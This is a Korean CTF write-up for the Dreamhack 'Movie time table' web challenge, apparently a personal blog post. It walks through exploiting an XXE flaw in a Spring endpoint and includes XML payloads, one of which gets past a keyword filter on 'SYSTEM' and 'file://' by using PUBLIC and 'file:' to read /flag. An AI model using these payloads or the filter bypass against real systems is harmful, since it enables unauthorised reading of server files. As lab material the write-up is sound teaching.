---
layout: single
title: "[Dreamhack] Moive time table write-up"
date: 2025-06-19 23:06 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] Movie time table

### 문제 설명

- Hmm, What should I watch?

<br>

### ✏️ 풀이

문제 사이트에 접속해보면 /table 경로로 리다이렉트 되고 아래와 같이 스케줄 표가 나와있다.

<img src="/images/2025-06-18-Movie-time-table/image-20250619154341301.png" alt="image-20250619154341301" style="zoom:50%;" />

<br>

이번 문제는 spring 기반으로 만들어졌고, Controller 부분의 소스 코드를 보면 /test 경로가 하나 더 존재한다. 이는 POST 요청만 받고, `request.getInputStream()` 으로 body 값을 byte stream으로 읽어온다. 이는 `movieService.getMovies` 함수의 인자로 XML으로 처리되는 구조임을 알 수 있다.

```java
@Controller
public class MovieController {

    @Autowired
    private MovieService movieService;

    @GetMapping("/table")
    public String getMovieTable(Model model) {
        File file = new File("/app/tables/table.xml");
        model.addAttribute("movies", movieService.getMovies(file));
        return "table";
    }

    @PostMapping("/test")
    public String test(HttpServletRequest request, Model model) {
        try {
            model.addAttribute("movies", movieService.getMovies(request.getInputStream()));
        } catch (IOException e) {
            e.getStackTrace();
        }
        return "table";
    }
}
```

<br>

/test 경로로 POST 요청을 보내보면, response 처럼 아래 Title과 Showtimes 부분이 비워져서 응답된다.

![image-20250619163723815](/images/2025-06-18-Movie-time-table/image-20250619163723815.png)

<br>

소스 코드에 있는 table.xml 파일의 XML 내용을 전체 복사해서 아래 Content-Type을 application/xml으로 변경하고, 붙여넣어 요청하면 전과 동일하게 Moive Schedule에 내용이 잘 응답되어 출력되는 것을 알 수 있다.

![image-20250619164107151](/images/2025-06-18-Movie-time-table/image-20250619164107151.png)

<br>

/test 경로의 소스 코드를 더 분석해보면 사용자가 입력한 XML 데이터가 서버에서 직접 파싱하고 있기 때문에 XXE 취약점을 시도해볼 수 있겠다.

```java
    @PostMapping("/test")
    public String test(HttpServletRequest request, Model model) {
        try {
            model.addAttribute("movies", movieService.getMovies(request.getInputStream()));
        } catch (IOException e) {
            e.getStackTrace();
        }
        return "table";
    }
```

<br>

아래와 같이 DTD를 통해 XXE test를 해보면 showtimes 부분에 XXE test!가 잘 출력되는 것을 확인할 수 있다.

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE test!">
]>
<moives>
<movie>
<title>test</title>
<showtime>
&xxe;</showtime>
</movie></moives>
```

![image-20250619165146703](/images/2025-06-18-Movie-time-table/image-20250619165146703.png)

<br>

`MovieService.java` 소스 코드를 살펴보면, 아래와 같이 `SYSTEM` 과 `file://` 가 키워드로 필터링되고 있어 이를 우회해야 한다. `SYSTEM` 같은 경우 `PUBLIC` 으로 대신하여 사용할 수 있고, `file://` 경우 `file:` 만 사용하여 이 필터링을 우회할 수 있다.  

```java
if (inputStreamString.contains("SYSTEM")){
    throw new BadKeywordException("Not allowed.");
}
if(inputStreamString.contains("file://")){
    throw new BadKeywordException("Not allowed.");
}
```

<br>

아래와 같이 flag의 위치는 Dockerfile을 확인하였을 때 `/` 경로에 위치하여 있고 아래와 같이 엔티티 코드를 작성하여 DTD를 만들어주면 XXE 취약점으로 flag를 획득할 수 있다.

```
<!ENTITIY xxe PUBLIC "file" "file:/flag">
```

![image-20250619192433377](/images/2025-06-18-Movie-time-table/image-20250619192433377.png)